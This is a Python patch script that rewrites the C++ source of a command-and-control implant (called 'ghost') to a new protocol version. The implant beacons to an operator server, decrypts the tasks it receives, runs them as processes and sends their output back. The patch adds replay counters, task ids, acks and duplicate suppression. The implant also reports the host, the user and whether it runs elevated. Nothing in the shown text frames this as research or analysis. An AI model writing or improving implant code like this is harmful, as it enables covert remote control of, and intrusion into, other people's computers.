# One-shot patch: protocol v2 on the implant side (task ids, ack, counters, run id).
src_path = 'src/c2.cpp'
s = open(src_path, encoding='utf-8').read()

def rep(old, new, name):
    global s
    assert old in s, 'NOT FOUND: ' + name
    assert s.count(old) == 1, 'NOT UNIQUE: ' + name
    s = s.replace(old, new, 1)
    print('ok:', name)

# 1. globals
rep('static bool        g_ChannelUp = false;\n'
    'static std::string g_SrvPubB64;          // last accepted server public point',
    'static bool        g_ChannelUp = false;\n'
    'static std::string g_SrvPubB64;          // last accepted server public point\n'
    '\n'
    '// Protocol v2 state - monotonic counters inside the authenticated payloads\n'
    '// (replay protection), a per-run id, the pending task ack, and the recently\n'
    '// seen task ids used to deduplicate retried tasks.\n'
    'static unsigned long long g_TxN       = 0;   // implant -> server counter\n'
    'static unsigned long long g_RxSrvN    = 0;   // last accepted server counter\n'
    'static std::wstring       g_RunId;            // 8 hex chars, generated per run\n'
    'static std::string        g_PendingAck;       // task id to ack in next beacon\n'
    'static std::string        g_SeenTids[32];     // circular buffer of task ids\n'
    'static int                g_SeenIdx     = 0;\n'
    '\n'
    'static bool TidSeen(const std::string& tid) {\n'
    '    for (int i = 0; i < 32; ++i)\n'
    '        if (!g_SeenTids[i].empty() && g_SeenTids[i] == tid) return true;\n'
    '    return false;\n'
    '}\n'
    'static void TidRemember(const std::string& tid) {\n'
    '    g_SeenTids[g_SeenIdx % 32] = tid;\n'
    '    ++g_SeenIdx;\n'
    '}',
    'globals')

# 2. BuildBeaconJson — line-level edits; strings built via chr() to stay sane
Q, BS, NL = chr(34), chr(92), chr(10)
rep('static std::string BuildBeaconJson(const Session& s) {',
    'static std::string BuildBeaconJson(const Session& s, unsigned long long n,\n'
    '                                   const std::string& ack) {', 'bb sig')
rep('    std::string user = JsonEscape(WStringToUTF8(s.username));\n'
    '    std::ostringstream j;',
    '    std::string user = JsonEscape(WStringToUTF8(s.username));\n'
    '    std::string run  = JsonEscape(WStringToUTF8(g_RunId));\n'
    '    std::ostringstream j;', 'bb run var')
sess_line = ('      << ' + Q + BS + Q + 'session' + BS + Q + ':' + BS + Q + Q +
             '  << sid  << ' + Q + BS + Q + ',' + Q)
new_lines = ('      << ' + Q + BS + Q + 'run' + BS + Q + ':' + BS + Q + Q +
             '      << run  << ' + Q + BS + Q + ',' + Q + ',' + NL +
             '      << ' + Q + BS + Q + 'n' + BS + Q + ':' + Q +
             '          << n    << ","' + NL +
             '      << ' + Q + BS + Q + 'ack' + BS + Q + ':' + BS + Q + Q +
             '    << JsonEscape(ack) << ' + Q + BS + Q + ',' + Q + ',')
rep(sess_line, sess_line + NL + new_lines, 'bb fields')

# 3. SendBeacon head
rep('BOOL SendBeacon(const Session& session, std::wstring& taskOut) {\n'
    '    taskOut = L"sleep";\n'
    '    std::string payload = BuildBeaconJson(session);',
    'BOOL SendBeacon(const Session& session, std::wstring& taskOut,\n'
    '                std::wstring& tidOut, bool& dupOut) {\n'
    '    taskOut.clear(); tidOut.clear(); dupOut = false;\n'
    '    unsigned long long n = ++g_TxN;\n'
    '    std::string payload = BuildBeaconJson(session, n, g_PendingAck);',
    'SendBeacon head')

# 4. SendBeacon tail  (current comments contain U+2014 em-dashes)
EM = chr(8212)
old_tail = ('    std::string cmd = JsonGetString(resp.body, "cmd");\n'
            '    if (!cmd.empty()) {\n'
            '        if (JsonFlag(resp.body, "e")) {\n'
            '            // Encrypted blob decrypts to {"cmd":"<task>"} ' + EM + ' unpack the field.\n'
            '            std::string dec = AesGcmDecrypt(g_SessionKey, cmd);\n'
            '            if (dec.empty()) {\n'
            '                DebugLog(L"cmd decrypt failed ' + EM + ' re-handshaking");\n'
            '                g_ChannelUp = false;\n'
            '                return FALSE;\n'
            '            }\n'
            '            taskOut = UTF8ToWString(JsonGetString(dec, "cmd"));\n'
            '        } else {\n'
            '            taskOut = UTF8ToWString(cmd);\n'
            '        }\n'
            '        DebugLog(L"Task received: " + taskOut);\n'
            '    }\n'
            '    return TRUE;\n'
            '}')
new_tail = ('    std::string cmd = JsonGetString(resp.body, "cmd");\n'
            '    if (cmd.empty()) return TRUE;\n'
            '\n'
            '    std::string dec = cmd;\n'
            '    if (JsonFlag(resp.body, "e")) {\n'
            '        // Encrypted blob decrypts to {"cmd":..,"tid":..,"n":N}.\n'
            '        dec = AesGcmDecrypt(g_SessionKey, cmd);\n'
            '        if (dec.empty()) {\n'
            '            DebugLog(L"cmd decrypt failed - re-handshaking");\n'
            '            g_ChannelUp = false;\n'
            '            return FALSE;\n'
            '        }\n'
            '        unsigned long long srvN = 0;\n'
            '        try { srvN = std::stoull(JsonGetString(dec, "n")); }\n'
            '        catch (...) {\n'
            '            DebugLog(L"bad server counter - re-handshaking");\n'
            '            g_ChannelUp = false;\n'
            '            return FALSE;\n'
            '        }\n'
            '        if (srvN <= g_RxSrvN) {\n'
            '            DebugLog(L"replayed server counter - re-handshaking");\n'
            '            g_ChannelUp = false;\n'
            '            return FALSE;\n'
            '        }\n'
            '        g_RxSrvN = srvN;\n'
            '        cmd = JsonGetString(dec, "cmd");\n'
            '    }\n'
            '    std::string tid = JsonGetString(dec, "tid");\n'
            '    if (cmd == "sleep" || cmd == "exit") {\n'
            '        taskOut = UTF8ToWString(cmd);\n'
            '        return TRUE;\n'
            '    }\n'
            '    taskOut = UTF8ToWString(cmd);\n'
            '    tidOut  = UTF8ToWString(tid);\n'
            '    if (!tid.empty()) {\n'
            '        g_PendingAck = tid;              // ack in the next beacon\n'
            '        if (TidSeen(tid)) {\n'
            '            dupOut = true;               // retried task - do not run twice\n'
            '            DebugLog(L"Duplicate task " + tidOut);\n'
            '        } else {\n'
            '            TidRemember(tid);\n'
            '        }\n'
            '    }\n'
            '    DebugLog(L"Task received: " + taskOut + L" tid=" + tidOut);\n'
            '    return TRUE;\n'
            '}')
rep(old_tail, new_tail, 'SendBeacon tail')

open(src_path, 'w', encoding='utf-8', newline='').write(s)
print('part 1 written')

# 5. SendResult
# 5. SendResult - signature + body line (contains raw quotes; match by anchor)
EM2 = chr(8212)
anchor = 'BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {'
assert anchor in s, 'SendResult anchor missing'
NL2 = chr(10)
si = s.find(anchor)
bi = s.find('    std::string body = "{\\"session\\"', si)
assert bi > si, 'body line not found'
line_end = s.find(NL2, bi)
new_line = ('    std::string body = "{\\"session\\":\\"" + sid + "\\",\\"tid\\":\\"" + JsonEscape(WStringToUTF8(tid)) +\n'
            '                       "\\",\\"status\\":\\"" + JsonEscape(WStringToUTF8(status)) +\n'
            '                       "\\",\\"n\\":" + std::to_string(++g_TxN) + ",\\"output\\":\\"" + out + "\\"}";')
s = s[:bi] + new_line + s[line_end:]
sig_new = ('BOOL SendResult(const std::wstring& sessionId, const std::wstring& tid,\n'
           '                const std::wstring& status, const std::wstring& output) {')
s = s.replace(anchor, sig_new, 1)
print('ok: SendResult')

# 6. ExecuteCommand signature + status reporting
rep('std::wstring ExecuteCommand(const std::wstring& cmd) {\n'
    '    std::string cmdStr = WStringToUTF8(cmd);',
    'std::wstring ExecuteCommand(const std::wstring& cmd, std::wstring& statusOut) {\n'
    '    statusOut = L"ok";\n'
    '    std::string cmdStr = WStringToUTF8(cmd);', 'exec sig')
rep('    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return L"[error: pipe failed]";',
    '    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) { statusOut = L"error"; return L"[error: pipe failed]"; }',
    'exec pipe')
rep('            CloseHandle(hRead); CloseHandle(hWrite);\n'
    '            return L"[error: CreateProcess failed]";',
    '            CloseHandle(hRead); CloseHandle(hWrite);\n'
    '            statusOut = L"error";\n'
    '            return L"[error: CreateProcess failed]";', 'exec spawn')
rep('    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT) {\n'
    '        TerminateProcess(pi.hProcess, 1);\n'
    '    }',
    '    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT) {\n'
    '        TerminateProcess(pi.hProcess, 1);\n'
    '        statusOut = L"timeout";\n'
    '    }', 'exec timeout')

# 7. BeaconLoop: run id
rep('    g_SessionId = session.sessionId;\n'
    '    EcdhInit();   // fresh ephemeral keypair per run ' + EM2 + ' key set by first beacon' + chr(39) + 's handshake\n'
    '    DebugLog(L"Session: " + session.sessionId);',
    '    g_SessionId = session.sessionId;\n'
    '    EcdhInit();   // fresh ephemeral keypair per run ' + EM2 + ' key set by first beacon' + chr(39) + 's handshake\n'
    '    {   // per-run id (8 hex) - lets the operator tell implant runs apart\n'
    '        unsigned char rb[4] = {};\n'
    '        BCryptGenRandom(nullptr, rb, 4, BCRYPT_USE_SYSTEM_PREFERRED_RNG);\n'
    '        wchar_t tmp[9];\n'
    '        swprintf_s(tmp, L"%02x%02x%02x%02x", rb[0], rb[1], rb[2], rb[3]);\n'
    '        g_RunId = tmp;\n'
    '    }\n'
    '    DebugLog(L"Session: " + session.sessionId + L" run=" + g_RunId);', 'run id')

# 8. BeaconLoop call site
rep('            std::wstring task;\n'
    '            BOOL ok = SendBeacon(session, task);',
    '            std::wstring task, tid, status = L"ok";\n'
    '            bool dup = false;\n'
    '            BOOL ok = SendBeacon(session, task, tid, dup);', 'loop call')

# 9. hello / migrate / exit SendResult calls
rep('                SendResult(session.sessionId,\n'
    '                    L"[ghost] implant online\\r\\nhost: " + session.hostname +\n'
    '                    L"\\r\\nuser: " + session.username +\n'
    '                    L"\\r\\nelevated: " + (session.elevated ? L"yes" : L"no"));',
    '                SendResult(session.sessionId, L"", L"ok",\n'
    '                    L"[ghost] implant online\\r\\nhost: " + session.hostname +\n'
    '                    L"\\r\\nuser: " + session.username +\n'
    '                    L"\\r\\nrun: " + g_RunId +\n'
    '                    L"\\r\\nelevated: " + (session.elevated ? L"yes" : L"no"));', 'hello')
rep('SendResult(session.sessionId, L"[ghost] migration complete, exiting");',
    'SendResult(session.sessionId, L"", L"ok", L"[ghost] migration complete, exiting");', 'migrate')
rep('SendResult(session.sessionId, L"[ghost] exiting on operator command");',
    'SendResult(session.sessionId, L"", L"ok", L"[ghost] exiting on operator command");', 'exit')

# 10. task execution block
EM3 = chr(8212)
rep('                DebugLog(L"Exec: " + task);\n'
    '                std::wstring result = ExecuteCommand(task);',
    '                DebugLog(L"Exec: " + task + L" tid=" + tid);\n'
    '                std::wstring result;\n'
    '                if (dup) {\n'
    '                    // Retried delivery of a task we already ran ' + EM3 + ' the result\n'
    '                    // went out with the previous run; tell the server it is\n'
    '                    // complete without executing twice.\n'
    '                    result = L"[duplicate task - result already delivered]";\n'
    '                } else {\n'
    '                    result = ExecuteCommand(task, status);\n'
    '                }', 'exec block')
rep('                SendResult(session.sessionId, result);',
    '                SendResult(session.sessionId, tid, status, result);', 'result call')

open(src_path, 'w', encoding='utf-8', newline='').write(s)
print('part 2 written - all patches applied')

